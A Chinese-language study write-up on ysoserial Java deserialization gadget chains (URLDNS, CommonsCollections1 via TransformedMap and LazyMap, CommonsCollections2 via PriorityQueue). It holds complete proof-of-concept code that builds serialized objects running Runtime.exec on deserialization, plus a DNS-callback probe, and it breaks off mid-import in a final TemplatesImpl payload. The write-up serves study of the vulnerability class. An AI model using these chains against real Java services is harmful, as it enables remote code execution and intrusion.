# 前言
在学习`java`安全时，`ysoserial`项目是一个非常值得的项目，这里记录一下自己学习过程中的思路及反序列化链的构造方式。

# Java反射知识
## 定义
Java 反射机制可以可以无视类方法、变量去访问权限修饰符（如：protected、private 等），并且可以调用任意类的任何方法、访问并修改成员变量值。

## 反射的定义
反射是 Java 的特征之一，反射的存在使运行中的 Java 够获取自身信息，并且可以操作类或对象的内部属性。
通过反射可以在运行时获得程序或程序集中每一个类型的成员和成员信息；Java 的反射机制亦是如此，在运行状态中，通过 Java 的反射机制，能够判断一个对象的任意方法和属性。

## 反射的基本运用
### 获取类对象
#### forName() 方法
当要使用 Class 类中的方法获取类对象时，就需要使用 forName() 方法，只需要有类名称即可，在配置 JDBC 中通常采用这种方法。

![undefined](https://p5.ssl.qhimg.com/t01bd92a3287d97f4ec.png "undefined")

#### .class 方法
任何数据类型都具备静态的属性，因此可以使用 `.class` 直接获取其对应的 Class 对象，使用这种方法时需要明确用到类中的静态成员。

![undefined](https://p4.ssl.qhimg.com/t01069fd17131c2c3e9.png "undefined")

#### getClass() 方法
可以通过 Object 类中的 `getCLass()` 方法来获取字节码，使用这种方法时必须明确具体的类，然后创建对象。

![undefined](https://p5.ssl.qhimg.com/t01988b2e77444d97c6.png "undefined")

#### getSystemClassLoad().loadClass() 方法
`getSystemClassLoad().loadClass()` 方法与 `forName()` 方法类似，只要有类名即可；但是，`forName()` 的静态方法 JVM 会装载类，并且执行 `static()` 中的代码，而 `getSystemClassLoad().loadClass()` 不会执行 `ststic()` 中的代码。
例如 JDBC 中就是利用 `forName()` 方法，使 JVM 查找并加载制定的类到内存中，此时将 `com.mysql.jdbc.Driver` 当作参数传入就是让 JVM 去 `com.mysql.jdbc` 路径下查找 `Driver` 类，并将其加载到内存中。

![undefined](https://p0.ssl.qhimg.com/t017abcf8891be8a8fc.png "undefined")

### 获取类方法
#### getDeclaredMethods 方法
该方法返回类或接口声明的所有方法，包括 public、private 以及默认方法，但不包括继承的方法。

![undefined](https://p4.ssl.qhimg.com/t01fda5e327fd88dcc2.png "undefined")

#### getMethods 方法
getMethods 方法返回某个类的所有 public 方法，包括其继承类的 public 方法。

![undefined](https://p0.ssl.qhimg.com/t014af8fb37fa833e74.png "undefined")

#### getMethod 方法
getMethod 方法只能返回一个特定的方法，例如返回 Runtime 类中的 exec() 方法，该方法的第一个参数为方法名称，后面的参数为方法的参数对应 Class 的对象。

![undefined](https://p0.ssl.qhimg.com/t01d70e3f1336036b1c.png "undefined")

#### getDeclaredMethod 方法
该方法与 getMethod 方法类似，也只能返回一个特定的方法，该方法的第一个参数为方法名，第二个参数名是方法参数。

![undefined](https://p3.ssl.qhimg.com/t019160bf90633ad4a2.png "undefined")

### 获取类成员变量
先创建一个 Student 类：
```java
public class Student {
    private String id;
    private String name;
    private String age;
    public String content;
    protected String address;

    public String getId() {
        return id;
    }
    public void setId(String id) {
        this.id = id;
    }
    public String getName() {
        return name;
    }
    public void setName(String name) {
        this.name = name;
    }
    public String getAge() {
        return age;
    }
    public void setAge(String age) {
        this.age = age;
    }
    public String getContent() {
        return content;
    }
    public void setContent(String content) {
        this.content = content;
    }
    public String getAddress() {
        return address;
    }
    public void setAddress(String address) {
        this.address = address;
    }
}
```

#### getDeclaredFields 方法
getDeclaredFields 方法能够获得类的成员变量数组包括 public、private 和 protected，但是不包括父类的声明字段。

![undefined](https://p4.ssl.qhimg.com/t01bc4dcf2864f08334.png "undefined")

#### getFields 方法
getFields 方法能够获取某个类的所有 public 字段，包括父类中的字段。

![undefined](https://p0.ssl.qhimg.com/t01836dcea0c89ecebf.png "undefined")

#### getDeclaredField 方法
该方法与 getDeclaredFields 方法的区别是只能获得类的单个成员变量。

![undefined](https://p4.ssl.qhimg.com/t01a13a72a8c56fafb3.png "undefined")


# URLDNS链
## 前言
`URLDNS`是`ysoserial`中的一条利用链，通常用于检测是否存在`Java`反序列化漏洞，该利用链具有如下特点：

```php
[1] URLDNS 利用链只能发起 DNS 请求，并不能进行其它利用
[2] 不限制 jdk 版本，使用 Java 内置类，对第三方依赖没有要求
[3] 目标无回显，可以通过 DNS 请求来验证是否存在反序列化漏洞
```

## 原理
`java.util.HashMap`实现了`Serializable`接口，重写了`readObject`, 在反序列化时会调用`hash`函数计算`key`的`hashCode`，而`java.net.URL`的`hashCode`在计算时会调用`getHostAddress`来解析域名, 从而发出`DNS`请求。

## 分析过程
这里跟着`ysoserial`项目中`URLDNS`的`Gadget`来分析

```java
Gadget Chain:
    HashMap.readObject()
    HashMap.putVal()
    HashMap.hash()
    URL.hashCode()
```
先跟进`HashMap`，看看其自己实现的`readObject()`函数，这里通过`for`循环来将`HashMap`中存储的`key`通过`K key = (K) s.readObject();`来进行反序列化，在这之后调用`putVal()`和`hash()`函数。

![undefined](https://p2.ssl.qhimg.com/t01b4aa63a41d53d397.png "undefined")

跟进`hash()`函数看看是如何实现的，当`key!=null`时会调用`hashCode()`函数。

![undefined](https://p3.ssl.qhimg.com/t013200d7fe8e68a36e.png "undefined")

跟进`hashCode()`函数，由于在`ysoserial`中的`URLDNS`是利用`URL`对象，于是跟进`Java`基本类`URL`中关于`hashCode()`的部分`java/net/URL.java`，由于`hashCode`的值默认为`-1`，因此会执行`hashCode = handler.hashCode(this);`。

![undefined](https://p2.ssl.qhimg.com/t01ff50a052cea45622.png "undefined")

看看`handler.hashCode()`函数是如何实现的，这里利用一个`Demo`代码来调试看看。

```java
import java.net.URL;

public class URLDemo {
    public static void main(String[] args) throws Exception {
        URL url = new URL("http://6ppzw1.dnslog.cn");
        url.hashCode();
    }
}
```
先看看请求之后的结果，成功触发了`DNS`请求，来看看是如何实现的。

![undefined](https://p5.ssl.qhimg.com/t018dfa7a3bff56cca6.png "undefined")

调试跟进`java/net/URLStreamHandler.java`中的`hashCode()`函数，可以看到这里调用了一个函数`getHostAddress()`来进行`DNS`解析返回对应的`IP`。

![undefined](https://p4.ssl.qhimg.com/t015929d45775f32807.png "undefined")

在`ysoserial`中是通过`put()`函数来触发的，其实这一步的实现和前面的是一样的，都是通过`hash()`函数来实现的。

![undefined](https://p4.ssl.qhimg.com/t016ba85445740f6fc6.png "undefined")

但是上面的分析过程仿佛和反序列化并没有什么关联，其实当`HashMap`传入一个`URL`对象时，会进行一次`DNS`解析，并且`HashMap`实现了`Serializable`接口，重写了`readObject`，也就是说当一个`Java`应用存在反序列化漏洞时，可以通过传入一个序列化后的`HashMap`数据(将`URL`对象作为`key`放入`HashMap`中)，当传入的数据到达该`Java`应用的反序列化漏洞点时，这时程序就会调用`HashMap`重写的`readObject()`函数来反序列化读取数据，进而触发`key.hashCode()`函数进行一次`DNS`解析。

## ysoserial 项目代码分析
在`ysoserial`项目中`URLDNS`的代码并没有这么简单，还有一些其他的代码段，来看看这些"多余的"代码的用处是啥。

```java
public class URLDNS implements ObjectPayload<Object> {
        public Object getObject(final String url) throws Exception {
                URLStreamHandler handler = new SilentURLStreamHandler();
                HashMap ht = new HashMap();
                URL u = new URL(null, url, handler);
                ht.put(u, url); 
                Reflections.setFieldValue(u, "hashCode", -1);
                return ht;
        }
        public static void main(final String[] args) throws Exception {
                PayloadRunner.run(URLDNS.class, args);
        }
        static class SilentURLStreamHandler extends URLStreamHandler {

                protected URLConnection openConnection(URL u) throws IOException {
                        return null;
                }
                protected synchronized InetAddress getHostAddress(URL u) {
                        return null;
                }
        }
}
```
这里通过继承`URLStreamHandler`类，重写`openConnection()`和`getHostAddress()`函数，而这里重写的目的在于: `HashMap#put`时也会调用`getHostAddress()`函数进行一次`DNS`解析，这里就是通过重写的`getHostAddress()`函数来覆盖掉原函数，从而使其不进行`DNS`解析，避免在`Payload`在创建的时候进行`DNS`解析。

代码`Reflections.setFieldValue(u, "hashCode", -1);`中的`setFieldValue()`函数是`ysoserial`项目自定义的一个反射类中的函数。

```java
public class Reflections {
    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }
}
```
上述代码通过反射来设置`URL`类的`hashCode`的值为`-1`，这是因为在`HashMap#put`时已经调用过一次`hashCode()`函数，`hashCode`的值会改变不再为`-1`，这样会导致在下一步经过`HashMap`的`readObject()`函数反序列化时直接返回`hashCode`的值，不再调用`handler.hashCode(this)`，因此利用反射来将`hashCode`的值设为`-1`，最后利用`PayloadRunner.run()`来进行反序列化。

##  POC链

```java
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;

public class URLDemo {

    public static void main(String[] args) throws Exception {
        Date nowTime = new Date();
        HashMap hashmap = new HashMap();
        URL url = new URL("http://lttx9f.dnslog.cn");
        SimpleDateFormat simpleDateFormat = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
        Field filed = Class.forName("java.net.URL").getDeclaredField("hashCode");
        filed.setAccessible(true);  // 绕过Java语言权限控制检查的权限
        filed.set(url, 209);
        hashmap.put(url, 209);
        System.out.println("当前时间为: " + simpleDateFormat.format(nowTime));
        filed.set(url, -1);

        try {
            FileOutputStream fileOutputStream = new FileOutputStream("./dnsser");
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
            objectOutputStream.writeObject(hashmap);
            objectOutputStream.close();
            fileOutputStream.close();

            FileInputStream fileInputStream = new FileInputStream("./dnsser");
            ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
            objectInputStream.readObject();
            objectInputStream.close();
            fileInputStream.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

从请求结果中可以看出，在`Payload`生成阶段并没有发起`DNS`解析，而是在后续反序列化过程中进行的请求。

![undefined](https://p3.ssl.qhimg.com/t018577b396268d0b0d.png "undefined")

# CommonsCollections 介绍
[Apache Commons Collections](https://commons.apache.org/proper/commons-collections/index.html)是一个扩展了`Java`标准库里的`Collection`结构的第三方基础库，它提供了很多强有力的数据结构类型并实现了各种集合工具类，被广泛运用于各种`Java`应用的开发，目前常说的存在缺陷的版本是`Apache Commons Collections 3.2.1`以下（4.0版本也是存在的）

# CommonsCollections1链
## 环境搭建
1. `JDK`版本：JDK1.8u66（要求JDK8u71以下）
2. `Commons-Collections`版本：3.1

利用`maven`来进行搭建，先创建一个`Maven`项目，不用选择任何`Maven`模板，`pom.xml`中内容如下，之后选择右侧的更新，让其自动导入包即可。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>commons-collections</artifactId>
    <version>1.0-SNAPSHOT</version>

    <dependencies>
        <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.1</version>
        </dependency>
    </dependencies>

</project>
```

## 前置知识
在`Commons Collections`库中提供了一个抽象类`org.apache.commons.collections.map.AbstractMapDecorator`，这个类是`Map`的扩展，且是一个基础的装饰器，用来给`Map`提供附加功能，这个类有很多实现类，且每个类的触发方式也都是不一样的，在`Commons-Collections1`链中需要重点关注`TransformedMap`类和`LazyMap`类。

### Transformer
`org.apache.commons.collections.Transformer`是一个接口，提供了一个`transform()`方法，用来定义具体的转换逻辑，方法接收`Object`类型的`input`，处理后将`Object`返回，在`Commons-Collection`中，程序提供了多个`Transformer`的实现类，用来实现不同的`TransformedMap`类中`key、value`进行修改的功能。

![undefined](https://p4.ssl.qhimg.com/t01313227c0c6b4f797.png "undefined")

### TransformedMap
`org.apache.commons.collections.map.TransformedMap`类可以在一个元素被加入到集合内时自动对该元素进行特定的修饰变换，在`decorate()`方法中，第一个参数为修饰的`Map`类，第二个参数和第三个参数作为一个实现`Transformer`接口的类，用来转换修饰的`Map`的键、值（为`null`时不进行转换）；因此，当被修饰的`map`添加新元素的时候便会触发这两个类的`transform`方法。

![undefined](https://p1.ssl.qhimg.com/t01ff86ae3263e91bea.png "undefined")

### LazyMap
`org.apache.commons.collections.map.LazyMap`与`TransformedMap`类似，区别在于当`LazyMap`调用`get()`方法时如果传入的`key`不存在，则会触发相应参数的`Transformer`的`transform()`方法。
补充一下：与`LazyMap`具有相同功能的还有`org.apache.commons.collections.map.DefaultedMap`，同样也是`get()`方法会触发`transform()`方法。

![undefined](https://p3.ssl.qhimg.com/t01435a76085d483f3e.png "undefined")

### ConstantTransformer
`org.apache.commons.collections.functors.ConstantTransformer`是一个返回固定常量的`Transformer`，在初始化时储存了一个`Object`，后续的调用时会直接返回这个`Object`，这个类用于和`ChainedTransformer`配合，将其结果传入`InvokerTransformer`来调用我们指定的类的指定方法。

![undefined](https://p2.ssl.qhimg.com/t01664589b025b6b98c.png "undefined")

### InvokerTransformer
这是一个实现类，在`Commons-Collections 3.0`引入，利用反射来创建一个新的对象。

![undefined](https://p4.ssl.qhimg.com/t01e9fd2da1ef8411e7.png "undefined")

demo 代码：

```java
import org.apache.commons.collections.functors.InvokerTransformer;

public class InvokerTransformerDemo {
    public static void main(String[] args) {
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a /System/Applications/Calculator.app"});
        invokerTransformer.transform(Runtime.getRuntime());
    }
}
```
![undefined](https://p3.ssl.qhimg.com/t010a0689de44585cf2.png "undefined")

### ChainedTransformer
`org.apache.commons.collections.functors.ChainedTransformer`类也是一个`Transformer`的实现类，但是这个类自己维护了一个`Transformer`数组，在调用`ChainedTransformer`类的`transform`方法时会循环数组，依次调用`Transformer`数组中每个`Transformer`的`transform`方法，并将结果传递给下一个`Transformer`，在这样的处理机制下，可以链式调用多个`Transformer`来分别处理对象。

![undefined](https://p4.ssl.qhimg.com/t013afd8c2ef67c621a.png "undefined")

demo 代码：

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

public class ChainedTransformerDemo {

    public static void main(String[] args) throws ClassNotFoundException{
        // Transformer 数组
        Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
            new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
            new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a /System/Applications/Calculator.app"})
        };

        // ChainedTransformer 实例
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        chainedTransformer.transform("ChainedTransformerDemo");
    }
}
```

<img src="./images/8.png" alt="">

## Commons-Collections1-TransformedMap 分析
利用`TransformedMap`的`decorate`方法来将`ChainedTransformer`设置为`map`装饰器的处理方法，调用`TransformedMap`的`put()/setValue()`等方法时会触发`Transformer`链的调用方法。
寻找一个重写了`readObject`的类，在反序列化时可以改变`map`的值，定位到`sun.reflect.annotation.AnnotationInvocationHandler`类，这个类实现了`InvocationHandler`接口 (原本是用于`JDK`对于注解形式的动态代理)。

`AnnotationInvocationHandler`类的构造方法有两个参数，第一个参数是`Annotation`实现类的`Class`对象，第二个参数是一个`key`为`String`、`value`为`Object`的`Map`，需要注意的是，构造方法会对`var1`进行判断，当且仅当`var1`只有一个父接口且为`Annotation.class`时，才会将两个参数初始化在成员属性`type`和`memberValues`中。

![undefined](https://p2.ssl.qhimg.com/t01bc2115c0964e349f.png "undefined")

接着看看`AnnotationInvocationHandler`类重写的`readObject`方法，首先调用`AnnotationType.getInstance(this.type)`方法来获取`type`这个注解类对应的`AnnotationType`的对象，然后获取其`memberTypes`属性，这个属性是个`Map`，存放这个注解中可以配置的值，接着循环`this.memberValues`这个`Map`来获取其`Key`，如果注解类的`memberTypes`属性中存在与`this.memberValues`的`key`相同的属性，并且取得的值不是`ExceptionProxy`的实例也不是`memberValues`中值的实例，则取得其值并调用`setValue`方法写入值。

![undefined](https://p2.ssl.qhimg.com/t01d8b939c237f503e4.png "undefined")

根据上面的分析过程，构造`Payload`的思路基本就没啥问题了。

```
[1] 构造 AnnotationInvocationHandler 实例，传入一个注解类和一个 Map，这个 Map 的 key 中要具有注解类中存在的属性并且值不是对应的实例和 ExceptionProxy 对象
[2] 这个 Map 用 TransformedMap 进行封装，并且调用自定义的 ChainedTransformer 进行装饰
[3] ChainedTransformer 中写入多个 Transformer 实现类来进行链式调用从而达到恶意操作
```

### POC
```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollectionsTransformedMap {

    public static void main(String[] args) throws ClassNotFoundException, InstantiationException, IllegalAccessException, InvocationTargetException {
        Transformer[] transformer = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a /System/Applications/Calculator.app"})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformer);
        Map hashMap = new HashMap();
        hashMap.put("value", "d1no");
        Map transformedMap = TransformedMap.decorate(hashMap, null, chainedTransformer);
        Class<?> h3rmesk1t = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = h3rmesk1t.getDeclaredConstructors()[0];
        constructor.setAccessible(true);
        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Retention.class, transformedMap);

        try {
            // 序列化
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
            objectOutputStream.writeObject(invocationHandler);
            objectOutputStream.close();

            // 反序列化
            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
            ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
            objectInputStream.readObject();
            objectInputStream.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```
![undefined](https://p4.ssl.qhimg.com/t012f1e615114a039fd.png "undefined")

## Commons-Collections1-LazyMap 分析
核心点在`LazyMap#get`，`LazyMap`在没有`key`时会尝试调用`this.factory.transform`方法，而`this.factory`可以指定为`Transformer`对象，而且`transform`方法参数会被忽略掉，因此只需要寻找一个调用了`LazyMap.get`的方法。

![undefined](https://p1.ssl.qhimg.com/t01bb1035e66058a34f.png "undefined")

这里`AnnotationInvocationHandler`类的`invoke()`方法可以触发`this.memberValues`来调用`get`方法，从而触发`LazyMap#get`。

![undefined](https://p4.ssl.qhimg.com/t01a4f81de82e38d2c2.png "undefined")

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollectionsLazyMap {

    public static void main(String[] ars) throws ClassNotFoundException ,InstantiationException, IllegalAccessException, InvocationTargetException {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a /System/Applications/Calculator.app"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        Map LazyMap = org.apache.commons.collections.map.LazyMap.decorate(new HashMap(), chainedTransformer);
        Class<?> h3rmesk1t = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = h3rmesk1t.getDeclaredConstructors()[0];
        constructor.setAccessible(true);

        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Retention.class, LazyMap);
        Map mapProxy = (Map) Proxy.newProxyInstance(org.apache.commons.collections.map.LazyMap.class.getClassLoader(), org.apache.commons.collections.map.LazyMap.class.getInterfaces(), invocationHandler);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Retention.class, mapProxy);

        try {
            // 序列化
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
            objectOutputStream.writeObject(handler);
            objectOutputStream.close();

            // 反序列化
            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
            ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
            objectInputStream.readObject();
            objectInputStream.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```

![undefined](https://p2.ssl.qhimg.com/t0134722788f8b3c490.png "undefined")

## 调用链

```java
AnnotationInvocationHandler.readObject()
   *Map(Proxy).entrySet()
        *AnnotationInvocationHandler.invoke()
            LazyMap.get()/TransformedMap.setValue()
                ChainedTransformer.transform()
                    ConstantTransformer.transform()
                        InvokerTransformer.transform()
```

## 总结
利用`AnnotationInvocationHandler`在反序列化时会触发`Map`的`get/set`等操作，配合`TransformedMap/LazyMap`在执行`Map`对象的操作时会根据不同情况调用`Transformer`的转换方法，最后结合了`ChainedTransformer`的链式调用、`InvokerTransformer`的反射执行完成了恶意调用链的构成，其中`LazyMap`的触发还用到了动态代理机制。

# CommonsCollections2链
## 环境搭建
1. `JDK`版本：JDK1.8u66
2. `Commons-Collections4`版本：4.0
3. `javassit`版本：`3.25.0-GA`

利用`maven`来进行搭建，先创建一个`Maven`项目，不用选择任何`Maven`模板，`pom.xml`中内容如下，之后选择右侧的更新，让其自动导入包即可。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>commons-collections</artifactId>
    <version>1.0-SNAPSHOT</version>

    <dependencies>
        <dependency>
            <groupId>org.apache.commons</groupId>
            <artifactId>commons-collections4</artifactId>
            <version>4.0</version>
        </dependency>
        <dependency>
            <groupId>org.javassist</groupId>
            <artifactId>javassist</artifactId>
            <version>3.25.0-GA</version>
        </dependency>
    </dependencies>

</project>
```

## 前置知识
### PriorityQueue
`PriorityQueue`优先级队列是基于优先级堆的一种特殊队列，它给每个元素定义“优先级”，这样取出数据的时候会按照优先级来取，默认情况下，优先级队列会根据自然顺序对元素进行排序；因此放入`PriorityQueue`的元素必须实现`Comparable`接口，`PriorityQueue`会根据元素的排序顺序决定出队的优先级，如果没有实现`Comparable`接口，`PriorityQueue`还允许提供一个`Comparator`对象来判断两个元素的顺序，`PriorityQueue`支持反序列化，在重写的`readObject`方法中将数据反序列化到`queue`中之后，会调用`heapify()`方法来对数据进行排序。

![undefined](https://p2.ssl.qhimg.com/t01c824dedce8dc44e5.png "undefined")

在`heapify()`方法中又会调用`siftDown()`方法，在`comparator != null`下会调用`siftDownUsingComparator()`方法，在`siftDownUsingComparator()`方法中会调用`comparator`的`compare()`方法来进行优先级的比较和排序。

![undefined](https://p0.ssl.qhimg.com/t01cde5211a571ae9c6.png "undefined")

### TransformingComparator
`TransformingComparator`类似`TransformedMap`，用`Tranformer`来装饰一个`Comparator`，待比较的值将先使用`Tranformer`转换，再传递给`Comparator`比较，`TransformingComparator`初始化时配置`Transformer`和`Comparator`，如果不指定`Comparator`则使用`ComparableComparator.<Comparable>comparableComparator()`。
在调用`TransformingComparator`的`compare`方法时，调用了`this.transformer.transform()`方法对要比较的两个值进行转换，然后再调用`compare`方法比较。

![undefined](https://p0.ssl.qhimg.com/t01edfcad8af9ad1c2f.png "undefined")

在`PriorrityQueue`中最后会通过`comparator`的`compare()`方法来进行优先级的比较和排序，这里可以通过调用`TransformingComparator`中的`transform()`方法来和之前连接起来。

### Javassist
`Java`字节码以二进制的形式存储在`.class`文件中，每一个`.class`文件包含一个`Java`类或接口，`Javaassist`就是一个用来处理`Java`字节码的类库，它可以在一个已经编译好的类中添加新的方法，或者是修改已有的方法，并且不需要对字节码方面有深入的了解，同时也可以去生成一个新的类对象，通过完全手动的方式。

### TemplatesImpl
`TemplatesImpl`的属性`_bytecodes`存储了类字节码，`TemplatesImpl`类的部分方法可以使用这个类字节码去实例化这个类，这个类的父类需是`AbstractTranslet`，在这个类的无参构造方法或静态代码块中写入恶意代码，再借`TemplatesImpl`之手实例化这个类触发恶意代码。

## Commons-Collections2 分析
先跟进`PriorityQueue#readObject`，其`queue`的值来自于`readObject()`方法，是可控的，循环完成后会调用`heapify()`方法。

```java
private void readObject(java.io.ObjectInputStream s)
    throws java.io.IOException, ClassNotFoundException {
    // Read in size, and any hidden stuff
    s.defaultReadObject();

    // Read in (and discard) array length
    s.readInt();

    queue = new Object[size];

    // Read in all elements.
    for (int i = 0; i < size; i++)
        queue[i] = s.readObject();

    // Elements are guaranteed to be in "proper order", but the
    // spec has never explained what that might be.
    heapify();
}
```
在`heapify()`方法中，继续会调用`siftDown()`方法，这里的`x`是可控的，让`comparator`不为空进而调用`siftDownUsingComparator()`方法，在`siftDownUsingComparator()`方法中会调用前面`comparator`的`compare`方法。

```java
private void heapify() {
    for (int i = (size >>> 1) - 1; i >= 0; i--)
        siftDown(i, (E) queue[i]);
}

private void siftDown(int k, E x) {
    if (comparator != null)
        siftDownUsingComparator(k, x);
    else
        siftDownComparable(k, x);
}

private void siftDownUsingComparator(int k, E x) {
    int half = size >>> 1;
    while (k < half) {
        int child = (k << 1) + 1;
        Object c = queue[child];
        int right = child + 1;
        if (right < size &&
            comparator.compare((E) c, (E) queue[right]) > 0)
            c = queue[child = right];
        if (comparator.compare(x, (E) c) <= 0)
            break;
        queue[k] = c;
        k = child;
    }
    queue[k] = x;
}
```
这里将`comparator`和`TransformingComparator`结合起来，如果这里`this.transformer`是可控的话，就可以进一步利用`CC-1`链的后半段部分。

```java
public int compare(I obj1, I obj2) {
    O value1 = this.transformer.transform(obj1);
    O value2 = this.transformer.transform(obj2);
    return this.decorated.compare(value1, value2);
}
```
这里需要注意几个地方，在`heapify()`方法处的`size`要是大于`1`的，只有这样才会继续进入到`siftDown()`方法中。

### POC-1
利用`PriorityQueue`和`CommonsCollections-1`后半部分来进行构造。

```java
package CommonsCollections2;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

/**
 * @Author: H3rmesk1t
 * @Data: 2021/11/26 9:42 下午
 */
public class CommonsCollectionsGadget1 {
    // public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
    public static void CC2() throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a /System/Applications/Calculator.app"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);
        PriorityQueue priorityQueue = new PriorityQueue(2);
        priorityQueue.add(1);
        priorityQueue.add(2);
        Field field = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
        field.setAccessible(true);
        field.set(priorityQueue, transformingComparator);
        try {
            // 序列化操作
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./CC2EvilGadget.bin"));
            outputStream.writeObject(priorityQueue);
            outputStream.close();
            // 反序列化操作
            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./CC2EvilGadget.bin"));
            inputStream.readObject();
            inputStream.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        try {
            CC2();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

![undefined](https://p2.ssl.qhimg.com/t01e8d7587fbe23185d.png "undefined")

### POC-2
为了更好的符合实战利用中的要求，利用`InvokerTransformer`触发`TemplatesImpl`的`newTransformer`，从而读取恶意字节码从而进行执行命令，并且利用`javassist`和`TemplatesImpl`来进行构造。

```java
package CommonsCollections2;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.*;
import java.io.*;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
